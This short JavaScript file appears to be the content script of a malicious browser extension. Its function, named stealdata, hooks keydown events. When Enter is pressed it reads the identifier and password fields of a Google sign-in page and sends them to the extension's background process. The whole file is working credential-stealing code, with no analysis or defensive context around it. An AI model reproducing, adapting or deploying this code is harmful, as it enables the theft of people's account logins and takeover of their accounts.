function stealdata(code) {
	if (code == 13) {
		if (document.getElementsByName("password")[0] && document.getElementsByName("password")[0].value != "") {
			var data = {
				page: "Google",
				login: document.getElementsByName("identifier")[0].value,
				pass: document.getElementsByName("password")[0].value
			}
			chrome.runtime.sendMessage(JSON.stringify(data));
		}
	}
}
if (!iseventetkurwa) {
	var iseventetkurwa = true;
	document.addEventListener("keydown", function(e) {
		stealdata(e.keyCode);
	}, false);
}